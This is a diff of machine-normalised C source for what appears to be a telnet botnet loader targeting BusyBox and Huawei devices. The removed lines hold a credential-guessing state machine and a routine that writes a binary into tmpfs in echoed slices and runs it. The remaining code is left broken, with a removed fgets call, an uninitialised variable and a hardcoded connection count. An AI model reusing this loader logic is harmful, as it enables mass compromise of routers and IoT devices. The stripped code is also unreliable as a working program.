@@ -4,97 +4,22 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <fcntl.h>
+#include <time.h>
+#include <signal.h>
+#include <arpa/inet.h>
+#include <pthread.h>
+#include <sys/epoll.h>
+#include <math.h>
+#include <stdint.h>
 
-typedef unsigned long size_t;
 typedef __builtin_va_list __gnuc_va_list;
-typedef unsigned char __uint8_t;
-typedef unsigned short __uint16_t;
-typedef unsigned int __uint32_t;
-typedef unsigned long __uint64_t;
-typedef long __off_t;
-typedef long __off64_t;
-typedef long __time_t;
-typedef unsigned int __useconds_t;
-typedef long __ssize_t;
-typedef unsigned int __socklen_t;
-struct _IO_FILE ;
-typedef struct _IO_FILE FILE;
-struct _IO_marker ;
-struct _IO_codecvt ;
-struct _IO_wide_data ;
-typedef void _IO_lock_t;
-struct _IO_FILE {
-   int _flags ;
-   char *_IO_read_ptr ;
-   char *_IO_read_end ;
-   char *_IO_read_base ;
-   char *_IO_write_base ;
-   char *_IO_write_ptr ;
-   char *_IO_write_end ;
-   char *_IO_buf_base ;
-   char *_IO_buf_end ;
-   char *_IO_save_base ;
-   char *_IO_backup_base ;
-   char *_IO_save_end ;
-   struct _IO_marker *_markers ;
-   struct _IO_FILE *_chain ;
-   int _fileno ;
-   int _flags2 ;
-   __off_t _old_offset ;
-   unsigned short _cur_column ;
-   signed char _vtable_offset ;
-   char _shortbuf[1] ;
-   _IO_lock_t *_lock ;
-   __off64_t _offset ;
-   struct _IO_codecvt *_codecvt ;
-   struct _IO_wide_data *_wide_data ;
-   struct _IO_FILE *_freeres_list ;
-   void *_freeres_buf ;
-   size_t __pad5 ;
-   int _mode ;
-   char _unused2[(15UL * sizeof(int ) - 4UL * sizeof(void *)) - sizeof(size_t )] ;
-};
+
 typedef __gnuc_va_list va_list___0;
-typedef __ssize_t ssize_t;
-typedef __time_t time_t;
-struct __pthread_internal_list {
-   struct __pthread_internal_list *__prev ;
-   struct __pthread_internal_list *__next ;
-};
-typedef struct __pthread_internal_list __pthread_list_t;
-struct __pthread_mutex_s {
-   int __lock ;
-   unsigned int __count ;
-   int __owner ;
-   unsigned int __nusers ;
-   int __kind ;
-   short __spins ;
-   short __elision ;
-   __pthread_list_t __list ;
-};
-typedef unsigned long pthread_t;
-union __anonunion_pthread_mutexattr_t_488594144 {
-   char __size[4] ;
-   int __align ;
-};
-typedef union __anonunion_pthread_mutexattr_t_488594144 pthread_mutexattr_t;
-union pthread_attr_t {
-   char __size[56] ;
-   long __align ;
-};
-typedef union pthread_attr_t pthread_attr_t;
-union __anonunion_pthread_mutex_t_335460617 {
-   struct __pthread_mutex_s __data ;
-   char __size[40] ;
-   long __align ;
-};
-typedef union __anonunion_pthread_mutex_t_335460617 pthread_mutex_t;
-typedef __socklen_t socklen_t;
-typedef unsigned short sa_family_t;
-struct sockaddr {
-   sa_family_t sa_family ;
-   char sa_data[14] ;
-};
+
+
 struct linger {
    int l_onoff ;
    int l_linger ;
@@ -115,31 +40,7 @@ struct sockaddr_in {
    struct in_addr sin_addr ;
    unsigned char sin_zero[((sizeof(struct sockaddr ) - sizeof(unsigned short )) - sizeof(in_port_t )) - sizeof(struct in_addr )] ;
 };
-typedef void (*__sighandler_t)(int  );
-struct tm {
-   int tm_sec ;
-   int tm_min ;
-   int tm_hour ;
-   int tm_mday ;
-   int tm_mon ;
-   int tm_year ;
-   int tm_wday ;
-   int tm_yday ;
-   int tm_isdst ;
-   long tm_gmtoff ;
-   char const   *tm_zone ;
-};
-union epoll_data {
-   void *ptr ;
-   int fd ;
-   uint32_t u32 ;
-   uint64_t u64 ;
-};
-typedef union epoll_data epoll_data_t;
-struct epoll_event {
-   uint32_t events ;
-   epoll_data_t data ;
-} __attribute__((__packed__)) ;
+
 struct stateSlot_t {
    int slotUsed ;
    pthread_mutex_t mutex ;
@@ -163,44 +64,6 @@ struct __anonstruct_binary_838077917 {
    int num_slices ;
    unsigned char **slices ;
 };
-
-extern  __attribute__((__nothrow__)) int socket(int __domain , int __type , int __protocol ) ;
-extern  __attribute__((__nothrow__)) int bind(int __fd , struct sockaddr  const  * __restrict  __addr ,
-                                              socklen_t __len ) ;
-extern int connect(int __fd , struct sockaddr  const  * __restrict  __addr , socklen_t __len ) ;
-extern ssize_t send(int __fd , void const   *__buf , size_t __n , int __flags ) ;
-extern ssize_t recv(int __fd , void *__buf , size_t __n , int __flags ) ;
-extern  __attribute__((__nothrow__)) int getsockopt(int __fd , int __level , int __optname ,
-                                                    void * __restrict  __optval ,
-                                                    socklen_t * __restrict  __optlen ) ;
-extern  __attribute__((__nothrow__)) int setsockopt(int __fd , int __level , int __optname ,
-                                                    void const   *__optval , socklen_t __optlen ) ;
-extern  __attribute__((__nothrow__)) int shutdown(int __fd , int __how ) ;
-extern  __attribute__((__nothrow__)) uint16_t htons(uint16_t __hostshort )  __attribute__((__const__)) ;
-extern  __attribute__((__nothrow__)) __sighandler_t signal(int __sig , void (*__handler)(int  ) ) ;
-extern int fcntl(int __fd , int __cmd  , ...) ;
-extern int ( __attribute__((__nonnull__(1))) open)(char const   *__file , int __oflag
-                                                   , ...) ;
-extern  __attribute__((__nothrow__)) int *__errno_location(void)  __attribute__((__const__)) ;
-extern  __attribute__((__nothrow__)) in_addr_t inet_addr(char const   *__cp ) ;
-extern  __attribute__((__nothrow__)) time_t time(time_t *__timer ) ;
-extern  __attribute__((__nothrow__)) size_t strftime(char * __restrict  __s , size_t __maxsize ,
-                                                     char const   * __restrict  __format ,
-                                                     struct tm  const  * __restrict  __tp ) ;
-extern  __attribute__((__nothrow__)) struct tm *localtime(time_t const   *__timer ) ;
-extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1,3))) pthread_create)(pthread_t * __restrict  __newthread ,
-                                                                                             pthread_attr_t const   * __restrict  __attr ,
-                                                                                             void *(*__start_routine)(void * ) ,
-                                                                                             void * __restrict  __arg ) ;
-extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1))) pthread_mutex_init)(pthread_mutex_t *__mutex ,
-                                                                                               pthread_mutexattr_t const   *__mutexattr ) ;
-extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1))) pthread_mutex_lock)(pthread_mutex_t *__mutex ) ;
-extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1))) pthread_mutex_unlock)(pthread_mutex_t *__mutex ) ;
-extern  __attribute__((__nothrow__)) int epoll_create(int __size ) ;
-extern  __attribute__((__nothrow__)) int epoll_ctl(int __epfd , int __op , int __fd ,
-                                                   struct epoll_event *__event ) ;
-extern int epoll_wait(int __epfd , struct epoll_event *__events , int __maxevents ,
-                      int __timeout ) ;
 static char *bind_ip  =    (char *)"0.0.0.0";
 static unsigned char debug_mode  =    (unsigned char)0;
 static int maxConnectedSockets  =    0;
@@ -350,131 +213,7 @@ struct stateSlot_t stateTable[1]  = {      {0, {{0, 0U, 0, 0U, 0, (short)0, (sho
        (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0,
        (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0,
        (char)0, (char)0, (char)0, (char)0, (char)0}}};
-int matchPrompt(char *bufStr )
-{
-  int i ;
-  int q ;
-  char *prompts ;
-  char *tmpStr ;
-  size_t tmp ;
-  void *tmp___0 ;
-  size_t tmp___1 ;
-  char in_escape ;
-  char *tmp___2 ;
-  size_t tmp___3 ;
-  int bufLen ;
-  size_t tmp___4 ;
-  size_t tmp___5 ;
 
-  {
-  i = 0;
-  q = 0;
-  prompts = (char *)":>%$#";
-  tmp = strlen((char const   *)bufStr);
-  tmp___0 = malloc(tmp + 1UL);
-  tmpStr = (char *)tmp___0;
-  tmp___1 = strlen((char const   *)bufStr);
-  memset((void *)tmpStr, 0, tmp___1 + 1UL);
-  in_escape = (char)0;
-  i = 0;
-  while (1) {
-    tmp___3 = strlen((char const   *)bufStr);
-    if (! ((size_t )i < tmp___3)) {
-      break;
-    }
-    if ((int )*(bufStr + i) == 27) {
-      if ((int )in_escape == 0) {
-        in_escape = (char)1;
-      }
-    } else
-    if ((int )in_escape == 1) {
-      tmp___2 = strchr("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", (int )*(bufStr + i));
-      if ((unsigned long )tmp___2 != (unsigned long )((void *)0)) {
-        in_escape = (char)0;
-      } else {
-        goto _L;
-      }
-    } else
-    _L: /* CIL Label */
-    if ((int )in_escape == 0) {
-      strncat((char * __restrict  )tmpStr, (char const   * __restrict  )(bufStr + i),
-              (size_t )1);
-    }
-    i ++;
-  }
-  tmp___4 = strlen((char const   *)tmpStr);
-  bufLen = (int )tmp___4;
-  i = 0;
-  while (1) {
-    tmp___5 = strlen((char const   *)prompts);
-    if (! ((size_t )i < tmp___5)) {
-      break;
-    }
-    while (1) {
-      if (bufLen > q) {
-        if (! ((int )*((tmpStr + bufLen) - q) == 0)) {
-          if (! ((int )*((tmpStr + bufLen) - q) == 32)) {
-            if (! ((int )*((tmpStr + bufLen) - q) == 13)) {
-              if (! ((int )*((tmpStr + bufLen) - q) == 10)) {
-                break;
-              }
-            }
-          }
-        }
-      } else {
-        break;
-      }
-      q ++;
-    }
-    if ((int )*((tmpStr + bufLen) - q) == (int )*(prompts + i)) {
-      free((void *)tmpStr);
-      return (1);
-    }
-    i ++;
-  }
-  free((void *)tmpStr);
-  return (0);
-}
-}
-void hexDump(char *desc , void *addr , int len )
-{
-  int i ;
-  unsigned char buff[17] ;
-  unsigned char *pc ;
-
-  {
-  pc = (unsigned char *)addr;
-  if ((unsigned long )desc != (unsigned long )((void *)0)) {
-    printf((char const   * __restrict  )"%s:\n", desc);
-  }
-  i = 0;
-  while (i < len) {
-    if (i % 16 == 0) {
-      if (i != 0) {
-        printf((char const   * __restrict  )"  %s\n", buff);
-      }
-      printf((char const   * __restrict  )"  %04x ", i);
-    }
-    printf((char const   * __restrict  )" %02x", (int )*(pc + i));
-    if ((int )*(pc + i) < 32) {
-      buff[i % 16] = (unsigned char )'.';
-    } else
-    if ((int )*(pc + i) > 126) {
-      buff[i % 16] = (unsigned char )'.';
-    } else {
-      buff[i % 16] = *(pc + i);
-    }
-    buff[i % 16 + 1] = (unsigned char )'\000';
-    i ++;
-  }
-  while (i % 16 != 0) {
-    printf((char const   * __restrict  )"   ");
-    i ++;
-  }
-  printf((char const   * __restrict  )"  %s\n", buff);
-  return;
-}
-}
 int log_recv(int sock , void *buf , int len , int flags )
 {
   int ret ;
@@ -507,7 +246,7 @@ int log_recv(int sock , void *buf , int len , int flags )
     sprintf((char * __restrict  )(hex_buf), (char const   * __restrict  )"state %d - recv: %d",
             (int )stateTable[sock].state, ret);
     if (ret != -1) {
-      hexDump(hex_buf, buf, ret);
+
     } else {
       printf((char const   * __restrict  )"%s\n", hex_buf);
     }
@@ -531,7 +270,6 @@ int log_send(int sock , void *buf , int len , int flags )
     }
     sprintf((char * __restrict  )(hex_buf), (char const   * __restrict  )"state %d - send: %d",
             (int )stateTable[sock].state, len);
-    hexDump(hex_buf, buf, len);
   }
   bytes_sent += (unsigned int volatile   )len;
   tmp___0 = send(sock, (void const   *)buf, (size_t )len, flags);
@@ -569,46 +307,7 @@ int sockprintf(int sock , char *formatStr  , ...)
                                                                                 unsigned long l_len ,
                                                                                 void const   *s ,
                                                                                 unsigned long s_len )  __attribute__((__pure__)) ;
-void *( __attribute__((__nonnull__(1,3))) memmem)(void const   *l , unsigned long l_len ,
-                                                  void const   *s , unsigned long s_len )
-{
-  register char *cur ;
-  register char *last ;
-  char const   *cl ;
-  char const   *cs ;
-  void *tmp ;
-  int tmp___0 ;
 
-  {
-  cl = (char const   *)l;
-  cs = (char const   *)s;
-  if (l_len == 0UL) {
-    return ((void *)0);
-  } else
-  if (s_len == 0UL) {
-    return ((void *)0);
-  }
-  if (l_len < s_len) {
-    return ((void *)0);
-  }
-  if (s_len == 1UL) {
-    tmp = memchr(l, (int )*cs, l_len);
-    return (tmp);
-  }
-  last = ((char *)cl + l_len) - s_len;
-  cur = (char *)cl;
-  while ((unsigned long )cur <= (unsigned long )last) {
-    if ((int )*(cur + 0) == (int )*(cs + 0)) {
-      tmp___0 = memcmp((void const   *)cur, (void const   *)cs, s_len);
-      if (tmp___0 == 0) {
-        return ((void *)cur);
-      }
-    }
-    cur ++;
-  }
-  return ((void *)0);
-}
-}
 void handle_remote_closed(int fd )
 {
 
@@ -679,38 +378,7 @@ void closeAndCleanup(int fd )
   return;
 }
 }
-void updateAccessTime(int fd )
-{
-  time_t tmp ;
 
-  {
-  if (stateTable[fd].slotUsed) {
-    if (stateTable[fd].fd == fd) {
-      tmp = time((time_t *)((void *)0));
-      stateTable[fd].updatedAt = (int )tmp;
-    }
-  }
-  return;
-}
-}
-int getConnectedSockets(void)
-{
-  int q ;
-  int i ;
-
-  {
-  q = 0;
-  i = 0;
-  q = 0;
-  while ((unsigned int volatile   )q < maxFDSaw) {
-    if (stateTable[q].slotUsed) {
-      i ++;
-    }
-    q ++;
-  }
-  return (i);
-}
-}
 void *flood(void *par1 )
 {
   unsigned char buf[10241] ;
@@ -860,39 +528,7 @@ void *flood(void *par1 )
           if ((int )state___0->state == 2) {
             log_recv(state___0->fd, (void *)(buf), 1, 0);
             got = log_recv(state___0->fd, (void *)(buf + 1), 2, 0);
-            if (got > 0) {
-              state___0->state = (unsigned char)1;
-              if ((int )buf[1] == 253) {
-                if ((int )buf[2] == 31) {
-                  tmp1[0] = (unsigned char)255;
-                  tmp1[1] = (unsigned char)251;
-                  tmp1[2] = (unsigned char)31;
-                  log_send(state___0->fd, (void *)(tmp1), 3, 16384);
-                  tmp2[0] = (unsigned char)255;
-                  tmp2[1] = (unsigned char)250;
-                  tmp2[2] = (unsigned char)31;
-                  tmp2[3] = (unsigned char)0;
-                  tmp2[4] = (unsigned char)80;
-                  tmp2[5] = (unsigned char)0;
-                  tmp2[6] = (unsigned char)24;
-                  tmp2[7] = (unsigned char)255;
-                  tmp2[8] = (unsigned char)240;
-                  log_send(state___0->fd, (void *)(tmp2), 9, 16384);
-                  goto __Cont;
-                }
-              }
-              ii = 0;
-              while (ii < 3) {
-                if ((int )buf[ii] == 253) {
-                  buf[ii] = (unsigned char)252;
-                } else
-                if ((int )buf[ii] == 251) {
-                  buf[ii] = (unsigned char)253;
-                }
-                ii ++;
-              }
-              log_send(state___0->fd, (void *)(buf), 3, 16384);
-            }
+            
           }
           __Cont: /* CIL Label */
           if (got > 0) {
@@ -903,396 +539,7 @@ void *flood(void *par1 )
             break;
           }
         }
-        if ((int )state___0->state == 3) {
-          while (1) {
-            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
-            if (! (got > 0)) {
-              break;
-            }
-            tmp___1 = memmem((void const   *)(buf), (unsigned long )got, (void const   *)"Huawei Home Gateway",
-                             19UL);
-            if ((unsigned long )tmp___1 != (unsigned long )((void *)0)) {
-              state___0->special = (unsigned char)1;
-            }
-            tmp___2 = memmem((void const   *)(buf), (unsigned long )got, (void const   *)"BusyBox",
-                             7UL);
-            if ((unsigned long )tmp___2 != (unsigned long )((void *)0)) {
-              state___0->got_prompt = (unsigned char)1;
-              sockprintf(state___0->fd, (char *)"enable\r\n");
-              state___0->state = (unsigned char)7;
-              break;
-            }
-            tmp___3 = memmem((void const   *)(buf), (unsigned long )got, (void const   *)"ogin",
-                             4UL);
-            if ((unsigned long )tmp___3 != (unsigned long )((void *)0)) {
-              state___0->got_prompt = (unsigned char)1;
-              sockprintf(state___0->fd, (char *)"%s\r\n", state___0->username);
-              state___0->state = (unsigned char)4;
-              break;
-            } else {
-              tmp___4 = memmem((void const   *)(buf), (unsigned long )got, (void const   *)"sername",
-                               7UL);
-              if ((unsigned long )tmp___4 != (unsigned long )((void *)0)) {
-                state___0->got_prompt = (unsigned char)1;
-                sockprintf(state___0->fd, (char *)"%s\r\n", state___0->username);
-                state___0->state = (unsigned char)4;
-                break;
-              } else {
-                tmp___5 = matchPrompt((char *)(buf));
-                if (tmp___5) {
-                  state___0->got_prompt = (unsigned char)1;
-                  sockprintf(state___0->fd, (char *)"%s\r\n", state___0->username);
-                  state___0->state = (unsigned char)4;
-                  break;
-                }
-              }
-            }
-          }
-        }
-        if ((int )state___0->state == 4) {
-          while (1) {
-            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
-            if (! (got > 0)) {
-              break;
-            }
-            tmp___6 = memmem((void const   *)(buf), (unsigned long )got, (void const   *)"assword",
-                             7UL);
-            if ((unsigned long )tmp___6 != (unsigned long )((void *)0)) {
-              sockprintf(state___0->fd, (char *)"%s\r\n", state___0->password);
-              state___0->state = (unsigned char)5;
-              break;
-            } else {
-              tmp___7 = matchPrompt((char *)(buf));
-              if (tmp___7) {
-                sockprintf(state___0->fd, (char *)"%s\r\n", state___0->password);
-                state___0->state = (unsigned char)5;
-                break;
-              }
-            }
-          }
-        }
-        if ((int )state___0->state == 5) {
-          while (1) {
-            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
-            if (! (got > 0)) {
-              break;
-            }
-            tmp___8 = strcasestr((char const   *)(buf), "access denied");
-            if ((unsigned long )tmp___8 != (unsigned long )((void *)0)) {
-              state___0->state = (unsigned char)254;
-              break;
-            } else {
-              tmp___9 = strcasestr((char const   *)(buf), "invalid password");
-              if ((unsigned long )tmp___9 != (unsigned long )((void *)0)) {
-                state___0->state = (unsigned char)254;
-                break;
-              } else {
-                tmp___10 = strcasestr((char const   *)(buf), "login incorrect");
-                if ((unsigned long )tmp___10 != (unsigned long )((void *)0)) {
-                  state___0->state = (unsigned char)254;
-                  break;
-                } else {
-                  tmp___11 = strcasestr((char const   *)(buf), "password is wrong");
-                  if ((unsigned long )tmp___11 != (unsigned long )((void *)0)) {
-                    state___0->state = (unsigned char)254;
-                    break;
-                  }
-                }
-              }
-            }
-            tmp___12 = strcasestr((char const   *)(buf), "BusyBox");
-            if ((unsigned long )tmp___12 != (unsigned long )((void *)0)) {
-              sockprintf(state___0->fd, (char *)"enable\r\n");
-              state___0->state = (unsigned char)6;
-              break;
-            } else {
-              tmp___13 = matchPrompt((char *)(buf));
-              if (tmp___13) {
-                sockprintf(state___0->fd, (char *)"enable\r\n");
-                state___0->state = (unsigned char)6;
-                break;
-              }
-            }
-          }
-        }
-        if ((int )state___0->state == 6) {
-          while (1) {
-            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
-            if (! (got > 0)) {
-              break;
-            }
-            sockprintf(state___0->fd, (char *)"shell\r\n");
-            state___0->state = (unsigned char)7;
-            break;
-          }
-        }
-        if ((int )state___0->state == 7) {
-          while (1) {
-            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
-            if (! (got > 0)) {
-              break;
-            }
-            sockprintf(state___0->fd, (char *)"sh\r\n");
-            if ((int )state___0->special == 1) {
-              state___0->state = (unsigned char)250;
-            } else {
-              state___0->state = (unsigned char)8;
-            }
-            break;
-          }
-        }
-        if ((int )state___0->state == 8) {
-          while (1) {
-            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
-            if (! (got > 0)) {
-              break;
-            }
-            tmp___14 = matchPrompt((char *)(buf));
-            if (tmp___14) {
-              sockprintf(state___0->fd, (char *)"%s\r\n", "/bin/busybox VDOSS");
-              state___0->state = (unsigned char)9;
-              break;
-            }
-          }
-        }
-        if ((int )state___0->state == 9) {
-          while (1) {
-            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
-            if (! (got > 0)) {
-              break;
-            }
-            tmp___15 = strcasestr((char const   *)(buf), "applet not found");
-            if ((unsigned long )tmp___15 != (unsigned long )((void *)0)) {
-              tmp___16 = matchPrompt((char *)(buf));
-              if (tmp___16) {
-                sockprintf(state___0->fd, (char *)"cat /proc/mounts\r\n");
-                state___0->state = (unsigned char)10;
-                break;
-              }
-            }
-          }
-        }
-        if ((int )state___0->state == 10) {
-          while (1) {
-            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
-            if (! (got > 0)) {
-              break;
-            }
-            tmp___25 = strstr((char const   *)(buf), "tmpfs");
-            if ((unsigned long )tmp___25 != (unsigned long )((void *)0)) {
-              goto _L;
-            } else {
-              tmp___26 = strstr((char const   *)(buf), "ramfs");
-              if ((unsigned long )tmp___26 != (unsigned long )((void *)0)) {
-                _L: /* CIL Label */
-                tmp_buf = (char *)(buf);
-                start = (char *)((void *)0);
-                space = (char *)((void *)0);
-                memes = 0;
-                while (1) {
-                  tmp___20 = strstr((char const   *)tmp_buf, "tmpfs");
-                  if ((unsigned long )tmp___20 != (unsigned long )((void *)0)) {
-                    tmp___18 = strstr((char const   *)tmp_buf, "tmpfs");
-                    start = tmp___18;
-                  } else {
-                    tmp___19 = strstr((char const   *)tmp_buf, "ramfs");
-                    start = tmp___19;
-                  }
-                  space = strchr((char const   *)start, ' ');
-                  if ((unsigned long )start != (unsigned long )tmp_buf) {
-                    if ((int )*(start - 1) != 10) {
-                      while (1) {
-                        if ((unsigned long )start > (unsigned long )(buf)) {
-                          if (! ((int )*start != 10)) {
-                            break;
-                          }
-                        } else {
-                          break;
-                        }
-                        start --;
-                      }
-                      if ((unsigned long )start == (unsigned long )(buf)) {
-                        goto __Cont___0;
-                      }
-                      start ++;
-                      space = strchr((char const   *)start, ' ');
-                    }
-                  }
-                  if ((int )*(space + 1) == 47) {
-                    iii = 1;
-                    iii = 1;
-                    while (1) {
-                      if ((int )*(space + iii) == 0) {
-                        break;
-                      } else
-                      if ((int )*(space + iii) == 32) {
-                        break;
-                      }
-                      iii ++;
-                    }
-                    if (iii > 1) {
-                      strncpy((char * __restrict  )(state___0->path[memes]), (char const   * __restrict  )(space + 1),
-                              (size_t )(iii - 1));
-                      state___0->path[memes][iii - 1] = (char )'\000';
-                      memes ++;
-                    }
-                    space += iii;
-                    if ((int )*(space + 0) != 0) {
-                      iii = 1;
-                      while (1) {
-                        if ((int )*(space + iii) == 0) {
-                          break;
-                        } else
-                        if ((int )*(space + iii) == 32) {
-                          break;
-                        }
-                        iii ++;
-                      }
-                      space += iii;
-                    } else {
-                      break;
-                    }
-                  }
-                  tmp_buf = space;
-                  __Cont___0: /* CIL Label */
-                  tmp___21 = strstr((char const   *)tmp_buf, "tmpfs");
-                  if (! ((unsigned long )tmp___21 != (unsigned long )((void *)0))) {
-                    tmp___22 = strstr((char const   *)tmp_buf, "ramfs");
-                    if ((unsigned long )tmp___22 != (unsigned long )((void *)0)) {
-                      if (! (memes < 5)) {
-                        break;
-                      }
-                    } else {
-                      break;
-                    }
-                  }
-                }
-                tmp___23 = strlen((char const   *)(state___0->path[0]));
-                if (tmp___23 == 0UL) {
-                  strcpy((char * __restrict  )(state___0->path[0]), (char const   * __restrict  )"/");
-                }
-                sockprintf(state___0->fd, (char *)"/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a && /bin/busybox VDOSS\r\n",
-                           state___0->path[0], state___0->path[0], state___0->path[0]);
-                state___0->state = (unsigned char)100;
-                break;
-              } else {
-                tmp___24 = matchPrompt((char *)(buf));
-                if (tmp___24) {
-                  strcpy((char * __restrict  )(state___0->path[0]), (char const   * __restrict  )"/var/run");
-                  sockprintf(state___0->fd, (char *)"/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a && /bin/busybox VDOSS\r\n",
-                             state___0->path[0], state___0->path[0], state___0->path[0]);
-                  state___0->state = (unsigned char)100;
-                  break;
-                }
-              }
-            }
-          }
-        }
-        if ((int )state___0->state == 100) {
-          while (1) {
-            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
-            if (! (got > 0)) {
-              break;
-            }
-            tmp___29 = strcasestr((char const   *)(buf), "applet not found");
-            if ((unsigned long )tmp___29 != (unsigned long )((void *)0)) {
-              sockprintf(state___0->fd, (char *)"/bin/busybox echo -ne \'\' > %s/a && /bin/busybox VDOSS\r\n",
-                         state___0->path[state___0->pathInd]);
-              state___0->state = (unsigned char)101;
-              break;
-            } else {
-              tmp___28 = matchPrompt((char *)(buf));
-              if (tmp___28) {
-                state___0->pathInd = (uint8_t )((int )state___0->pathInd + 1);
-                if ((int )state___0->pathInd == 5) {
-                  strcpy((char * __restrict  )(state___0->path[0]), (char const   * __restrict  )"/var/run");
-                  state___0->pathInd = (uint8_t )0;
-                  sockprintf(state___0->fd, (char *)"/bin/busybox echo -ne \'\' > %s/a && /bin/busybox VDOSS\r\n",
-                             state___0->path[state___0->pathInd]);
-                  state___0->state = (unsigned char)101;
-                  break;
-                } else {
-                  tmp___27 = strlen((char const   *)(state___0->path[state___0->pathInd]));
-                  if (tmp___27 == 0UL) {
-                    strcpy((char * __restrict  )(state___0->path[0]), (char const   * __restrict  )"/var/run");
-                    state___0->pathInd = (uint8_t )0;
-                    sockprintf(state___0->fd, (char *)"/bin/busybox echo -ne \'\' > %s/a && /bin/busybox VDOSS\r\n",
-                               state___0->path[state___0->pathInd]);
-                    state___0->state = (unsigned char)101;
-                    break;
-                  }
-                }
-                sockprintf(state___0->fd, (char *)"/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a && /bin/busybox VDOSS\r\n",
-                           state___0->path[state___0->pathInd], state___0->path[state___0->pathInd],
-                           state___0->path[state___0->pathInd]);
-                break;
-              }
-            }
-          }
-        }
-        if ((int )state___0->state == 101) {
-          while (1) {
-            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
-            if (! (got > 0)) {
-              break;
-            }
-            tmp___31 = strcasestr((char const   *)(buf), "applet not found");
-            if ((unsigned long )tmp___31 != (unsigned long )((void *)0)) {
-              tmp___30 = state___0->echoInd;
-              state___0->echoInd = (uint16_t )((int )state___0->echoInd + 1);
-              sockprintf(state___0->fd, (char *)"/bin/busybox echo -ne %s >> %s/a && /bin/busybox VDOSS\r\n",
-                         *(binary.slices + tmp___30), state___0->path[state___0->pathInd]);
-              if ((int )state___0->echoInd == binary.num_slices) {
-                state___0->state = (unsigned char)102;
-              } else {
-                state___0->state = (unsigned char)101;
-              }
-              break;
-            }
-          }
-        }
-        if ((int )state___0->state == 102) {
-          while (1) {
-            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
-            if (! (got > 0)) {
-              break;
-            }
-            tmp___32 = strcasestr((char const   *)(buf), "applet not found");
-            if ((unsigned long )tmp___32 != (unsigned long )((void *)0)) {
-              sockprintf(state___0->fd, (char *)"%s/a %s; /bin/busybox VDOSS\r\n",
-                         state___0->path[state___0->pathInd], run_arg);
-              state___0->state = (unsigned char)103;
-              break;
-            }
-          }
-        }
-        if ((int )state___0->state == 103) {
-          while (1) {
-            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
-            if (! (got > 0)) {
-              break;
-            }
-            tmp___33 = strcasestr((char const   *)(buf), "applet not found");
-            if ((unsigned long )tmp___33 != (unsigned long )((void *)0)) {
-              state___0->state = (unsigned char)255;
-              break;
-            }
-          }
-        }
-        if ((int )state___0->state == 250) {
-          while (1) {
-            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
-            if (! (got > 0)) {
-              break;
-            }
-            tmp___34 = matchPrompt((char *)(buf));
-            if (tmp___34) {
-              sockprintf(state___0->fd, (char *)"show text /proc/self/environ\r\n");
-              state___0->state = (unsigned char)251;
-              break;
-            }
-          }
-        }
+
         if ((int )state___0->state == 251) {
           while (1) {
             got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
@@ -1306,7 +553,7 @@ void *flood(void *par1 )
               state___0->state = (unsigned char)8;
               break;
             } else {
-              tmp___36 = matchPrompt((char *)(buf));
+
               if (tmp___36) {
                 sockprintf(state___0->fd, (char *)"export PS1=\"prompt>\"\r\n");
                 state___0->state = (unsigned char)8;
@@ -1326,14 +573,7 @@ void *flood(void *par1 )
           closeAndCleanup(state___0->fd);
           is_closed = 1;
         }
-        if (state___0->slotUsed) {
-          if (old_state != (int )state___0->state) {
-            updateAccessTime(state___0->fd);
-          } else
-          if ((int )state___0->state == 101) {
-            updateAccessTime(state___0->fd);
-          }
-        }
+        
         pthread_mutex_unlock(& state___0->mutex);
         if (! is_closed) {
           event.events = (uint32_t )0;
@@ -1374,38 +614,7 @@ void *flood(void *par1 )
   return ((void *)0);
 }
 }
-void sighandler(int sig )
-{
 
-
-  {
-  printf((char const   * __restrict  )"\nctrl-c\n");
-  exit(0);
-}
-}
-void chomp(char *s )
-{
-
-
-  {
-  while (1) {
-    if (*s) {
-      if ((int )*s != 10) {
-        if (! ((int )*s != 13)) {
-          break;
-        }
-      } else {
-        break;
-      }
-    } else {
-      break;
-    }
-    s ++;
-  }
-  *s = (char)0;
-  return;
-}
-}
 void *loader(void *threadCount )
 {
   char readmelolfgt[1024] ;
@@ -1440,12 +649,12 @@ void *loader(void *threadCount )
   memset((void *)(readmelolfgt), 0, (size_t )1024);
   pch = (char *)((void *)0);
   while (1) {
-    tmp___9 = fgets((char * __restrict  )(readmelolfgt), 1024, (FILE * __restrict  )infd);
+
     if (! ((unsigned long )tmp___9 != (unsigned long )((void *)0))) {
       break;
     }
     while (1) {
-      tmp___0 = getConnectedSockets();
+      tmp___0 = 0;
       if (! (tmp___0 > maxConnectedSockets - 1)) {
         break;
       }
@@ -1484,64 +693,12 @@ void *loader(void *threadCount )
         continue;
       }
     }
-    dest_addr.sin_family = (sa_family_t )0;
-    dest_addr.sin_port = (unsigned short)0;
-    dest_addr.sin_addr.s_addr = 0U;
-    dest_addr.sin_zero[0] = (unsigned char)0;
-    dest_addr.sin_zero[1] = (unsigned char)0;
-    dest_addr.sin_zero[2] = (unsigned char)0;
-    dest_addr.sin_zero[3] = (unsigned char)0;
-    dest_addr.sin_zero[4] = (unsigned char)0;
